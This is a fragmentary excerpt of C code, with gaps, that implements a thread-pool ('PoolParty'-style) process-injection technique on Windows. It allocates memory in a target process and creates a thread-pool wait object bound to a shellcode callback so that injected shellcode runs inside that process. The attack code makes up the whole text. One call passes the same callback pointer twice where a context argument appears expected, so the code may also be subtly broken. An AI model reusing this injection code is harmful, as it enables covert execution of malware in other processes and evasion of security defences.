...
//static wchar_t POOL_PARTY_EVENT_NAME[] = L"RAVEPARTY";
...
PFULL_TP_WAIT w_CreateThreadpoolWait(PTP_WAIT_CALLBACK pWaitCallback, PVOID pWaitContext, PTP_CALLBACK_ENVIRON pCallbackEnviron) {
	...
	NTSTATUS status = pTpAllocWait(&pTpWait, pWaitCallback, pWaitCallback, pCallbackEnviron);
	printf("status : %x\n", status);
...
int SetupExecution(HANDLE hTarget, HANDLE hIoCompletion, PVOID shellcode_addr)
{
	...
	PFULL_TP_WAIT pTpWait = w_CreateThreadpoolWait(shellcode_callback, NULL, NULL);
	printf("Created TP_WAIT structure associated with the shellcode\n");


	PFULL_TP_WAIT pRemoteTpWait = (PFULL_TP_WAIT)w_VirtualAllocEx(hTarget, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	...
	PTP_DIRECT pRemoteTpDirect = (PTP_DIRECT)w_VirtualAllocEx(hTarget, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
